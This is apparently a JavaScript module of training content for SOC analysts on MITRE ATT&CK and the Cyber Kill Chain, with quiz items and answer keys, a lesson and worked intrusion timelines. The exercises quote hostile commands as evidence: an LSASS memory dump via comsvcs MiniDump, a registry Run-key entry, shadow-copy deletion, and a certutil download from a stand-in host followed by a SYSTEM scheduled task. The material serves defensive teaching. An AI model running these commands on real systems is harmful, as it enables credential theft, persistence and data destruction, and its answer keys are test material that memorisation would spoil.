// Level 2 · MITRE ATT&CK & attack chains: questions, lesson and misconceptions.
// Tactic names follow ATT&CK Enterprise v19 (April 2026: Defense Evasion split into
// Stealth and Defense Impairment). Technique IDs used here are stable across v18 and v19.

const items = [
  {
    id: 'ak-01',
    skill: 'l2-attack',
    difficulty: 1,
    type: 'mc',
    prompt: 'In MITRE ATT&CK, what is the difference between a **tactic** and a **technique**?',
    choices: [
      'A tactic is the adversary\'s goal (the why, e.g. Persistence); a technique is how they achieve it (e.g. Scheduled Task)',
      'A tactic is a specific tool; a technique is a group of attackers',
      'They mean the same thing',
      'A technique is the goal; a tactic is how it is done',
    ],
    answer: 'A tactic is the adversary\'s goal (the why, e.g. Persistence); a technique is how they achieve it (e.g. Scheduled Task)',
    misconceptions: {
      'A technique is the goal; a tactic is how it is done': 'attack-tactic-technique',
      'They mean the same thing': 'attack-tactic-technique',
    },
    explanation:
      'Tactics (TA####) are the columns of the matrix: the adversary\'s tactical objective. Techniques (T####) and sub-techniques (T####.###) are the ways to reach it, and **procedures** are the specific implementations a group or tool uses. Scheduled Task/Job (T1053) serves Execution, Persistence and Privilege Escalation.',
  },
  {
    id: 'ak-02',
    skill: 'l2-attack',
    difficulty: 1,
    type: 'text',
    prompt: 'Which ATT&CK **tactic** covers the ways adversaries keep access across reboots, password changes and other interruptions?',
    accept: ['persistence', 'ta0003', 'persistence (ta0003)'],
    misconceptions: { 'registry run keys': 'attack-tactic-technique', 'scheduled task': 'attack-tactic-technique', 'run key': 'attack-tactic-technique', installation: 'attack-framework-mixup' },
    explanation:
      '**Persistence** (TA0003). Techniques under it include Registry Run Keys (T1547.001), Scheduled Task (T1053.005), Create or Modify System Process: Windows Service (T1543.003) and Create Account (T1136). "Installation" is the equivalent phase in the Lockheed Martin Cyber Kill Chain, not an ATT&CK tactic.',
  },
  {
    id: 'ak-03',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'mc',
    prompt: 'On a server, PID 624 is lsass.exe. Which technique does this command map to?',
    snippet: String.raw`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\d.bin full`,
    choices: [
      'T1003.001 OS Credential Dumping: LSASS Memory (Credential Access)',
      'T1059.001 Command and Scripting Interpreter: PowerShell (Execution)',
      'T1547.001 Registry Run Keys (Persistence)',
      'T1486 Data Encrypted for Impact (Impact)',
    ],
    answer: 'T1003.001 OS Credential Dumping: LSASS Memory (Credential Access)',
    explanation:
      'comsvcs.dll exports MiniDump, which writes a full memory dump of a process: here LSASS, which holds credential material (NTLM hashes, Kerberos tickets). It is a "living off the land" way to do what mimikatz does, using signed Windows binaries. Map the behaviour (dumping LSASS), not the tool.',
  },
  {
    id: 'ak-04',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'mc',
    prompt: 'Which technique does this map to?',
    snippet: String.raw`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpd /d "C:\Users\ali\AppData\Local\odu.exe" /f`,
    choices: [
      'T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder',
      'T1053.005 Scheduled Task/Job: Scheduled Task',
      'T1112 Modify Registry, and nothing else',
      'T1021.001 Remote Services: RDP',
    ],
    answer: 'T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder',
    explanation:
      'A value under ...\\CurrentVersion\\Run launches the program at each logon of that user: T1547.001, used for Persistence (and Privilege Escalation when set under HKLM). It also technically modifies the registry, but the most specific, meaningful mapping is the Run key sub-technique.',
  },
  {
    id: 'ak-05',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'mc',
    prompt: 'On WS-ENG-14 you see event 7045 "A service was installed: PSEXESVC" and a 4624 Logon Type 3 from SRV-APP03 with account svc_deploy seconds earlier. Which **tactic** is this?',
    choices: ['Lateral Movement', 'Initial Access', 'Exfiltration', 'Reconnaissance'],
    answer: 'Lateral Movement',
    misconceptions: { 'Initial Access': 'attack-framework-mixup' },
    explanation:
      'PsExec copies a service binary over the ADMIN$ share (SMB/Windows Admin Shares, T1021.002) and runs it as a service (Service Execution, T1569.002): moving from SRV-APP03 to WS-ENG-14 with valid credentials. Initial Access is how the attacker first got into the network, not a hop between internal hosts.',
  },
  {
    id: 'ak-06',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'text',
    prompt: 'What is the ATT&CK technique ID for **Phishing** (the parent technique, without a sub-technique)?',
    accept: ['t1566', 't 1566', '1566'],
    explanation:
      '**T1566** Phishing, under Initial Access. Sub-techniques: T1566.001 Spearphishing Attachment, T1566.002 Spearphishing Link, T1566.003 Spearphishing via Service, T1566.004 Spearphishing Voice. A few IDs every analyst ends up knowing: T1566, T1059 (scripting interpreters), T1078 (valid accounts), T1003 (credential dumping).',
  },
  {
    id: 'ak-07',
    skill: 'l2-attack',
    difficulty: 1,
    type: 'mc',
    prompt: 'In the Lockheed Martin **Cyber Kill Chain**, a compromised laptop beaconing to the attacker\'s server every 60 seconds is in which phase?',
    choices: ['Command and Control', 'Weaponization', 'Reconnaissance', 'Delivery'],
    answer: 'Command and Control',
    explanation:
      'The seven phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control (C2), Actions on Objectives. A beacon means the implant is installed and checking in for instructions. ATT&CK has a Command and Control tactic too, but it is far more granular and not a strict sequence.',
  },
  {
    id: 'ak-08',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'multi',
    prompt: 'Which of these are **tactics** in ATT&CK Enterprise? Select all that apply.',
    choices: ['Initial Access', 'Lateral Movement', 'Exfiltration', 'Impact', 'Weaponization', 'Eradication'],
    answer: ['Initial Access', 'Lateral Movement', 'Exfiltration', 'Impact'],
    misconceptions: { Weaponization: 'attack-framework-mixup', Eradication: 'attack-framework-mixup' },
    explanation:
      'Enterprise ATT&CK v19 has 15 tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Stealth, Defense Impairment, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration and Impact. Weaponization is a Kill Chain phase; Eradication is an incident response phase (NIST SP 800-61).',
  },
  {
    id: 'ak-09',
    skill: 'l2-attack',
    difficulty: 3,
    type: 'mc',
    prompt: 'The detection team says: "We have a rule for T1059.001 (PowerShell), so we\'re covered." The rule matches `powershell.exe -enc`. Why is that claim too strong?',
    choices: [
      'A technique has many procedures: attackers use -e, -EncodedCommand, obfuscation, pwsh.exe, or load the PowerShell engine inside another process',
      'T1059.001 is not a real technique',
      'PowerShell attacks are always blocked by antivirus',
      'The claim is correct: one rule per technique is full coverage',
    ],
    answer: 'A technique has many procedures: attackers use -e, -EncodedCommand, obfuscation, pwsh.exe, or load the PowerShell engine inside another process',
    misconceptions: { 'The claim is correct: one rule per technique is full coverage': 'attack-coverage-checkbox' },
    explanation:
      'Coverage is per **procedure**, not per technique ID. PowerShell accepts abbreviated parameters (-e, -en, -enc...), can be heavily obfuscated, and its engine (System.Management.Automation) can run without powershell.exe at all. A green cell on a coverage map means "we detect at least one way", not "we detect this technique".',
  },
  {
    id: 'ak-10',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'mc',
    prompt: 'You confirm credential dumping (T1003.001) on a server. How does ATT&CK help you decide what to look for next?',
    choices: [
      'Stolen credentials are usually used next: look for Lateral Movement and Valid Accounts use (new logons from that server, RDP, SMB, PsExec)',
      'It tells you the attacker\'s name and location',
      'It tells you to close the alert, as dumping is the final step',
      'It does not: ATT&CK is only for reports',
    ],
    answer: 'Stolen credentials are usually used next: look for Lateral Movement and Valid Accounts use (new logons from that server, RDP, SMB, PsExec)',
    explanation:
      'ATT&CK gives you a map of what usually comes before and after. Credentials are dumped to be used: pivot to logons **from** that host and **by** the accounts that were on it (T1078 Valid Accounts, T1021 Remote Services). Attribution to a group is a separate, much harder question.',
  },
  {
    id: 'ak-11',
    skill: 'l2-attack',
    difficulty: 3,
    type: 'mc',
    prompt: 'Minutes after a new foothold, EDR records these commands. Which tactic are they?',
    snippet: 'whoami /groups\nnet group "Domain Admins" /domain\nnltest /dclist:corp.example\nnltest /domain_trusts',
    choices: ['Discovery', 'Exfiltration', 'Impact', 'Collection'],
    answer: 'Discovery',
    explanation:
      'The attacker is learning the environment: their own privileges, who the domain admins are (T1087.002 Account Discovery: Domain Account), where the domain controllers are, and which domains trust this one (T1482 Domain Trust Discovery). Discovery bursts right after a foothold are a strong signal, because normal users almost never run these.',
  },
  {
    id: 'ak-12',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'mc',
    prompt: 'Which technique does `vssadmin delete shadows /all /quiet` map to?',
    choices: [
      'T1490 Inhibit System Recovery (Impact)',
      'T1003 OS Credential Dumping (Credential Access)',
      'T1566 Phishing (Initial Access)',
      'T1071 Application Layer Protocol (Command and Control)',
    ],
    answer: 'T1490 Inhibit System Recovery (Impact)',
    explanation:
      'Deleting Volume Shadow Copies removes built-in restore points so victims cannot easily recover: T1490, under Impact. It usually comes right before or with T1486 Data Encrypted for Impact, so treat it as an emergency.',
  },
  {
    id: 'ak-13',
    skill: 'l2-attack',
    difficulty: 2,
    type: 'text',
    prompt: 'Which ATT&CK tactic describes stealing data **out** of the victim network (for example over the C2 channel or to cloud storage)?',
    accept: ['exfiltration', 'ta0010', 'exfil'],
    misconceptions: { 'actions on objectives': 'attack-framework-mixup', collection: 'attack-tactic-technique' },
    explanation:
      '**Exfiltration** (TA0010), for example T1041 Exfiltration Over C2 Channel or T1567.002 Exfiltration to Cloud Storage. **Collection** is gathering the data first (staging, archiving). "Actions on Objectives" is the broad final Kill Chain phase.',
  },
  {
    id: 'ak-14',
    skill: 'l2-attack',
    difficulty: 3,
    type: 'mc',
    prompt: 'The coverage heatmap shows T1003.001 (LSASS Memory) green: there is a rule that alerts on mimikatz command lines. In a red-team exercise, LSASS was dumped with a signed tool (procdump) and nothing fired. What went wrong?',
    choices: [
      'The rule detected one procedure (the mimikatz tool), not the behaviour (any process reading LSASS memory)',
      'The heatmap was right: procdump is not credential dumping',
      'The red team broke the rules by using a signed tool',
      'LSASS cannot be dumped with signed tools',
    ],
    answer: 'The rule detected one procedure (the mimikatz tool), not the behaviour (any process reading LSASS memory)',
    misconceptions: { 'The heatmap was right: procdump is not credential dumping': 'attack-coverage-checkbox' },
    explanation:
      'Detect the behaviour: unusual processes opening a handle to lsass.exe with memory-read access, dump files named like lsass*.dmp, comsvcs MiniDump. Tool-name rules turn a heatmap green while leaving most procedures undetected.',
  },
];

const lesson = {
  skill: 'l2-attack',
  title: 'MITRE ATT&CK & attack chains',
  goal: 'Map evidence to tactics and techniques, and use the map to predict the next move.',
  sections: [
    {
      id: 'framework',
      heading: 'Tactics, techniques, procedures',
      body: [
        'MITRE ATT&CK is a free knowledge base of adversary behaviour observed in real intrusions. **Tactics** are the goals (the columns): why the attacker does something. **Techniques** (T####) and **sub-techniques** (T####.###) are how. **Procedures** are the specific ways a group or tool does it.',
        'Enterprise ATT&CK v19 (April 2026) has 15 tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Stealth, Defense Impairment, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. (v19 split the old Defense Evasion tactic into Stealth and Defense Impairment.)',
      ],
    },
    {
      id: 'mapping',
      heading: 'Mapping evidence',
      body: ['Map the **behaviour**, not the tool name, and pick the most specific sub-technique the evidence supports. One action can serve several tactics. Common mappings:'],
      evidence: {
        label: 'Evidence -> technique',
        text: 'Macro document from email           T1566.001 Spearphishing Attachment\nHidden, encoded PowerShell          T1059.001 PowerShell\nRun key / scheduled task            T1547.001 / T1053.005\nWeb server spawning a shell         T1190 Exploit Public-Facing App, T1505.003 Web Shell\nLSASS memory dump                   T1003.001 LSASS Memory\nPsExec service on another host      T1021.002 SMB/Admin Shares + T1569.002 Service Execution\nRegular HTTPS beacons               T1071.001 Web Protocols\nShadow copies deleted               T1490 Inhibit System Recovery',
      },
    },
    {
      id: 'killchain',
      heading: 'The Cyber Kill Chain, and how ATT&CK differs',
      body: [
        'Lockheed Martin\'s **Cyber Kill Chain** has seven phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives. It is a simple story of an intrusion, useful for "how far did they get?"',
        'ATT&CK is far more granular and not strictly linear: attackers loop through Discovery, Credential Access and Lateral Movement many times. Do not mix vocabularies: Weaponization is a Kill Chain phase, Eradication is an incident response phase, neither is an ATT&CK tactic.',
      ],
    },
    {
      id: 'using',
      heading: 'Using ATT&CK in the SOC',
      body: ['ATT&CK earns its keep when it changes what you do next:'],
      points: [
        '**Triage:** after credential dumping, look for lateral movement; after discovery, expect privilege escalation.',
        '**Reporting:** a shared language for incident reports and threat intel.',
        '**Detection coverage:** map rules to techniques (for example in ATT&CK Navigator) to find gaps.',
        '**Hunting:** techniques relevant to your threats become hypotheses.',
        'Beware the green heatmap: one rule per technique is not coverage. Procedures vary.',
      ],
    },
  ],
  worked: [
    {
      id: 'ak-w1',
      title: 'Mapping an intrusion timeline',
      artifactLabel: 'Incident timeline (condensed)',
      artifact:
        '06:57  User opens Invoice_4471.docm from email\n06:58  WINWORD.EXE > powershell.exe -w hidden -enc ...\n06:58  svch0st.exe dropped in AppData; HKCU Run key "WinUpdate" added\n07:05  Beacon to 198.51.100.77:443 every 2 min\n07:15  4625 failures from WS-FIN-07 against SRV-FS01 (administrator, backupadmin, svc_sql)\n07:16  4624 svc_sql on SRV-FS01, Logon Type 3, 4672 special privileges',
      question: 'Map each step to ATT&CK.',
      steps: [
        '06:57 the document arrived by email with a malicious macro: Initial Access, T1566.001 Spearphishing Attachment; the user opening it is T1204.002 User Execution: Malicious File.',
        '06:58 Word runs hidden, encoded PowerShell: Execution, T1059.001. The Run key is Persistence, T1547.001; naming the file svch0st.exe is Masquerading (T1036), a Stealth technique.',
        '07:05 regular HTTPS check-ins: Command and Control, T1071.001 Web Protocols.',
        '07:15 guessing passwords for several accounts from the infected host: Credential Access, T1110 Brute Force. 07:16 using the guessed svc_sql account on the file server: T1078 Valid Accounts, with the SMB logon supporting Lateral Movement (T1021.002).',
      ],
      conclusion: 'The mapping shows the attacker has gone from one laptop to a privileged account on a file server: the next likely moves are Discovery, Collection and Exfiltration or ransomware (Impact). Contain now and hunt for svc_sql logons elsewhere.',
    },
  ],
  faded: [
    {
      id: 'ak-f1',
      title: 'Finish the mapping',
      artifactLabel: 'EDR events on SRV-APP03',
      artifact:
        String.raw`22:01  w3wp.exe > cmd.exe /c whoami
22:02  cmd.exe > certutil.exe -urlcache -f http://203.0.113.77/t.dll C:\Windows\Temp\t.dll
22:04  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Windows\Temp\m.dmp full   (612 = lsass.exe)
22:09  schtasks /create /tn "IIS Log Rotate" /tr "rundll32 C:\Windows\Temp\t.dll,Start" /sc hourly /ru SYSTEM`,
      question: 'Map the remaining steps.',
      given: [
        '22:01 the IIS worker process spawning a shell points to a web shell or exploited web app: T1190 / T1505.003, and `whoami` is Discovery (T1033).',
        '22:02 certutil downloading a DLL is Ingress Tool Transfer (T1105), abusing a signed Windows binary.',
      ],
      todo: [
        {
          prompt: 'Which technique is the 22:04 rundll32/comsvcs command?',
          type: 'mc',
          choices: ['T1003.001 OS Credential Dumping: LSASS Memory', 'T1059.001 PowerShell', 'T1071.001 Web Protocols'],
          answer: 'T1003.001 OS Credential Dumping: LSASS Memory',
          explanation: 'MiniDump of PID 612, which is lsass.exe: dumping LSASS memory to steal credentials (Credential Access).',
        },
        {
          prompt: 'Which ATT&CK tactic does the 22:09 schtasks command serve?',
          type: 'text',
          accept: ['persistence', 'ta0003'],
          explanation: 'An hourly task running the dropped DLL as SYSTEM keeps the attacker\'s code running: Persistence via T1053.005 Scheduled Task. The innocent-sounding name "IIS Log Rotate" is masquerading on top.',
        },
      ],
    },
  ],
};

const misconceptions = [
  {
    id: 'attack-tactic-technique',
    skill: 'l2-attack',
    name: 'Mixing up tactics and techniques',
    description: 'Swaps tactic (goal) and technique (method), or names a technique when asked for a tactic.',
    fix: 'Tactic = why (the goal: Persistence, Credential Access, Exfiltration). Technique = how (Registry Run Keys, LSASS Memory, Exfiltration Over C2 Channel). A quick test: a tactic answers "what is the attacker trying to achieve?", a technique answers "what exactly did they do?".',
    lesson: 'l2-attack#framework',
  },
  {
    id: 'attack-framework-mixup',
    skill: 'l2-attack',
    name: 'Mixing ATT&CK with other frameworks',
    description: 'Uses Kill Chain phases (Weaponization, Installation) or incident response phases (Eradication) as ATT&CK tactics, or calls internal movement "Initial Access".',
    fix: 'Three different models: the Cyber Kill Chain (7 phases, Reconnaissance to Actions on Objectives), ATT&CK (15 Enterprise tactics in v19, each with techniques) and the NIST incident response lifecycle (Preparation; Detection & Analysis; Containment, Eradication & Recovery; Post-Incident Activity). Initial Access is only the first entry into the network; moving between internal hosts is Lateral Movement.',
    lesson: 'l2-attack#killchain',
  },
  {
    id: 'attack-coverage-checkbox',
    skill: 'l2-attack',
    name: 'One rule per technique = covered',
    description: 'Believes a single detection for a technique ID means the technique is covered.',
    fix: 'Techniques have many procedures. A rule matching `powershell.exe -enc` or the word "mimikatz" catches one of them. Real coverage means detecting the underlying behaviour (encoded or obfuscated script execution, any process reading LSASS memory) and testing it, for example with red-team or atomic tests.',
    lesson: 'l2-attack#using',
  },
];

export const ATTACK = { items, lesson, misconceptions };
